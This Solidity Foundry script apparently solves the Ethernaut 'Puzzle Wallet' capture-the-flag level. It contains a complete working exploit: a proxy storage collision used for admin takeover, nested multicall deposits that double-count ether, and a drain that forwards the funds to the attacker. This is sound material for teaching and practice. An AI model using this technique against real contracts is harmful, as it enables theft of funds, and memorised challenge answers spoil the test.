// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { PuzzleProxy, PuzzleWallet } from "./Problem.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";


contract Solution {
    address payable forwardingAddress;

    function hijack(PuzzleWallet _puzzleWallet, address payable _newAdmin) external payable {
        PuzzleProxy(payable(address(_puzzleWallet))).proposeNewAdmin(address(this));
        _puzzleWallet.addToWhitelist(address(this));

        bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
        bytes[] memory depositCalldataArray = new bytes[](1);
        depositCalldataArray[0] = depositCalldata;
        bytes memory multicallCalldata = abi.encodeWithSignature("multicall(bytes[])", depositCalldataArray);
        bytes[] memory multicallCalldataArray = new bytes[](2);
        multicallCalldataArray[0] = multicallCalldata;
        multicallCalldataArray[1] = multicallCalldata;

        _puzzleWallet.multicall{value: address(_puzzleWallet).balance}(multicallCalldataArray);

        bytes memory withdrawCalldata;
        forwardingAddress = _newAdmin;
        _puzzleWallet.execute(address(this), address(_puzzleWallet).balance, withdrawCalldata);

        uint newAdminUint = uint(uint160(_newAdmin));
        _puzzleWallet.setMaxBalance(newAdminUint);

        require(PuzzleProxy(payable(address(_puzzleWallet))).admin() == _newAdmin, "Admin should be new owner");
    }

    receive() external payable {
        forwardingAddress.send(msg.value);
    }
}

contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {
        PuzzleWallet puzzleWallet = PuzzleWallet(_instanceAddress);
        PuzzleProxy puzzleProxy = PuzzleProxy(_instanceAddress);

        vm.startBroadcast();
        Solution solution = new Solution();
        solution.hijack{value: address(puzzleWallet).balance}(puzzleWallet, payable(tx.origin));
        vm.stopBroadcast();

        assert(puzzleProxy.admin() == tx.origin);
    }

    function getLevelAddress() internal view override returns(address) {
        return 0xe13a4a46C346154C41360AAe7f070943F67743c9;
    }

    function getCreationValue() internal view override returns(uint256) {
        return 0.001 ether;
    }

}

